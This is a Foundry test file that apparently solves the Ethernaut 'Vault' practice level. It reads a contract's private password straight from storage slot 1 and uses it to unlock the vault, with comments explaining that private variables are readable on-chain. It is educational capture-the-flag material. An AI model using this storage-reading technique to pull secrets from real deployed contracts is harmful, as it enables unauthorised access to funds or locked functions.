// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Vault.sol";
import "src/levels/VaultFactory.sol";

contract TestVault is BaseTest {
    Vault private level;

    using stdStorage for StdStorage;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new VaultFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Vault(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.locked(), true);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        /// contract LeetContract {
        ///     uint256 private leet = 1337; // slot 0
        /// }

        // We can unlock the contract if we know the password that was used to lock it
        // Password is stored in the smart contract but it's visibility is private
        // but nothing is really private in the blockchain, private visibility can only prevent
        // other smart contracts to access it.

        // We can read a variable of the smart contract off-chain
        // directly from the storage slot even if it's visibility is set to private.

        // Reading first index of the storage slot because password is stored in the second slot
        bytes32 password = vm.load(address(level), bytes32(uint256(1)));
        level.unlock(password);

        assertEq(level.locked(), false);

        vm.stopPrank();
    }
}
